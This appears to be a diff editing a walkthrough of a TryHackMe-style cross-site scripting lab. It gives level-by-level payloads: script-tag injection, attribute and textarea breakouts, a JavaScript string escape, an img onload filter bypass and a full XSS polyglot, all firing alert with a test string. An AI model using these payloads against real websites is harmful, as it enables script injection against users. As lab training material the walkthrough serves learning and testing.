@@ -13,19 +13,17 @@ The aim for each level will be to execute the JavaScript alert function with the
 
 ## **Level One:**
 
-![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png)
-
 If you view the Page Source, You'll see your name reflected in the code:
 
 ```jsx
-<div class="text-cemter">
-		<h2>hello, tester</h2>
+<div class="text-center">
+	<h2>hello, tester</h2>
 </div>
 ```
 
 Instead of entering your name, we're going to try entering the following JavaScript Payload:
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```bash
 **<script>alert('XXXTESTXXX');</script>**
@@ -35,7 +33,7 @@ Now, when you click the enter button, you'll get an alert popup with the string�
 
 ```jsx
 <div class="text-center">
-		<h2>hello, <script>alert('**XXXTESTXXX**');</script></h2>
+	<h2>hello, <script>alert('**XXXTESTXXX**');</script></h2>
 </div>
 ```
 
@@ -45,19 +43,17 @@ Then, you'll receive a confirmation message that your payload was successful.
 
 Like the previous level, you're being asked again to enter your name. This time, when clicking enter, your name is reflected in an input tag instead:
 
-![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png)
-
 Viewing the page source, you can see your name reflected inside the value attribute of the input tag:
 
 ```jsx
 <div class="text-center">
-		<h2>Hello, <input value="tester"></h2>
+	<h2>Hello, <input value="tester"></h2>
 </div>
 ```
 
 It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we must escape the input tag first so the payload can run properly. You can do this with the following payload.
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```bash
 **"><script>alert('XXXTESTXXX');</script>**
@@ -67,11 +63,11 @@ The critical part of the payload is the **`">`,** which closes the value param
 
 This now closes the input tag properly and allows the JavaScript payload to run:
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```jsx
 <div class="text-center">
-		<h2>Hello, <input value=""><script>alert('XXXTESTXXX');</script>"></h2>
+	<h2>Hello, <input value=""><script>alert('XXXTESTXXX');</script>"></h2>
 </div>
 ```
 
@@ -80,8 +76,6 @@ When you click the enter button, an alert popup with the string THM will appear.
 ## **Level Three:**
 
 You're presented with another form asking for your name. As in the previous level, your name is reflected inside an HTML tag, this time, the text area tag.
-
-![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png)
 
 We'll have to escape the text area tag a little differently from the input one (in Level Two) by using the following payload:
 
@@ -95,7 +89,7 @@ This turns this:
 
 ```jsx
 <div class="text-center">
-		<h2>Hello, <textarea>tester</textarea></h2>
+	<h2>Hello, <textarea>tester</textarea></h2>
 </div>
 ```
 
@@ -103,7 +97,7 @@ Into This:
 
 ```jsx
 <div class="text-center">
-		<h2>Hello, <textarea></textarea><script>alert('**XXTESTXX**');</script></textarea></h2>
+	<h2>Hello, <textarea></textarea><script>alert('**XXTESTXX**');</script></textarea></h2>
 </div>
 ```
 
@@ -117,13 +111,13 @@ Entering your name into the form will reflect it on the page. This level looks s
 
 ```jsx
 <script>
-		document.getElementsByClassName('name')[0].innerHTML='tester';
+	document.getElementsByClassName('name')[0].innerHTML='tester';
 </script>
 ```
 
 You'll have to escape the existing JavaScript command so you're able to run your code; you can do this with the following payload :
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```bash
 **';alert('XXXTESTXXX');//**
@@ -133,7 +127,7 @@ You'll have to escape the existing JavaScript command so you're able to run your
 
 ```jsx
 <script>
-		document.getElementsByClassName('name')[0].innerHTML='';alert('**XXXTESTXXX');//';**
+	document.getElementsByClassName('name')[0].innerHTML='';alert('**XXXTESTXXX');//';**
 </script>
 ```
 
@@ -145,7 +139,7 @@ This level looks the same as level one, and your name is reflected in the same p
 
 ```jsx
 <div class="text-center">
-		<h2>Hello, <>alert('**XXXTESTXXX**');</></h2>
+	<h2>Hello, <>alert('**XXXTESTXXX**');</></h2>
 </div>
 ```
 
@@ -187,7 +181,7 @@ Similar to level two, where we had to escape from the value attribute of an inpu
 **"><script>alert('XXXTESTXXX');</script>**
 ```
 
-**B**ut that doesn't work. Let's inspect the page source to see why that doesn't work.
+**But that doesn't work. Let's inspect the page source to see why that doesn't work.
 
 ```jsx
 <div class="text-center">
@@ -200,7 +194,7 @@ You can see that the < and > characters get filtered out from our payload, preve
 
 Let's change our payload to reflect this:
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```bash
 **/images/cat.jpg" onload="alert('XXXTESTXXX');**
@@ -210,8 +204,8 @@ Let's change our payload to reflect this:
 
 ```jsx
 <div class="text-center">
-		<h2>Your Picture</h2>
-		<img src="/images/cat.jpg" onload="alert('XXXTESTXXX');">
+	<h2>Your Picture</h2>
+	<img src="/images/cat.jpg" onload="alert('XXXTESTXXX');">
 </div>
 ```
 
@@ -221,7 +215,7 @@ When you click the enter button, an alert popup with the “XXXTESTXX” string 
 
 An XSS polyglot is a string of text that can escape attributes and tags and bypass filters. You could have used the polyglot below on all six levels you've just completed, and it would have executed the code successfully.
 
-`**T**ry entering the payload:**`
+`**Try entering the payload:**`
 
 ```jsx
 **jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XXXTESTXXX') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XXXTESTXXX')//>\x3e**
